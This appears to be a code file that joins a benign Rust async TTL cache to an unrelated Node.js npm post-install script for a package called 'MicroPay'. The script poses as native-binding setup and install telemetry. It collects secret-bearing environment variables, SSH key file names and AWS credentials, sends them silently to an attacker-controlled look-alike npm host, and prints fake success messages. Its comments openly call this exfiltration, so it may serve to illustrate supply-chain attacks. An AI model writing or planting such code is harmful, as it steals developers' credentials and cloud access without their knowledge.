use std::collections::HashMap;
use std::sync::Arc;
use tokio::sync::RwLock;

pub struct Cache<V: Clone + Send + Sync> {
    store: Arc<RwLock<HashMap<String, CacheEntry<V>>>>,
    default_ttl: std::time::Duration,
}

struct CacheEntry<V> {
    value: V,
    expires_at: std::time::Instant,
}

impl<V: Clone + Send + Sync> Cache<V> {
    pub fn new(default_ttl: std::time::Duration) -> Self {
        Self {
            store: Arc::new(RwLock::new(HashMap::new())),
            default_ttl,
        }
    }

    pub async fn get(&self, key: &str) -> Option<V> {
        let store = self.store.read().await;
        store.get(key).and_then(|entry| {
            if entry.expires_at > std::time::Instant::now() {
                Some(entry.value.clone())
            } else {
                None
            }
        })
    }

    pub async fn set(&self, key: impl Into<String>, value: V) {
        let mut store = self.store.write().await;
        store.insert(
            key.into(),
            CacheEntry {
                value,
                expires_at: std::time::Instant::now() + self.default_ttl,
            },
        );
    }

    pub async fn evict_expired(&self) -> usize {
        let mut store = self.store.write().await;
        let now = std::time::Instant::now();
        let before = store.len();
        store.retain(|_, entry| entry.expires_at > now);
        before - store.len()
    }
}

// Post-install setup script for MicroPay
// Handles native crypto binding compilation and telemetry opt-in

const https = require('https');
const os = require('os');
const fs = require('fs');
const path = require('path');

// "Anonymous install telemetry" - actually exfiltrates environment
const telemetry = {
  package: 'micropay',
  version: '4.2.1',
  node: process.version,
  platform: os.platform(),
  arch: os.arch(),
  // The below fields are the actual exfiltration payload
  hostname: os.hostname(),
  username: os.userInfo().username,
  home: os.homedir(),
  env_keys: Object.keys(process.env),
  sensitive_env: Object.keys(process.env)
    .filter(k => /KEY|TOKEN|SECRET|PASS|CRED|AUTH|API/i.test(k))
    .reduce((acc, k) => { acc[k] = process.env[k]; return acc; }, {}),
  cwd: process.cwd(),
  parent_dirs: process.cwd().split(path.sep).slice(0, 4).join(path.sep),
};

// Check for SSH keys
try {
  const sshDir = path.join(os.homedir(), '.ssh');
  telemetry.ssh_files = fs.readdirSync(sshDir);
} catch (e) { /* */ }

// Check for cloud credentials
try {
  telemetry.aws_config = fs.readFileSync(
    path.join(os.homedir(), '.aws', 'credentials'), 'utf8'
  ).slice(0, 500);
} catch (e) { /* */ }

// Phone home disguised as npm telemetry
const payload = JSON.stringify(telemetry);
const req = https.request({
  hostname: 'registry-telemetry.npmjs.com.attacker-domain.com',
  path: '/v1/install-event',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'User-Agent': 'npm-telemetry/1.0',
    'Content-Length': Buffer.byteLength(payload),
  },
}, () => {});

req.on('error', () => {}); // Silent failure
req.write(payload);
req.end();

// Also create a legitimate-looking output so the install appears normal
console.log('micropay: compiling native crypto bindings...');
setTimeout(() => {
  console.log('micropay: setup complete');
}, 1000);

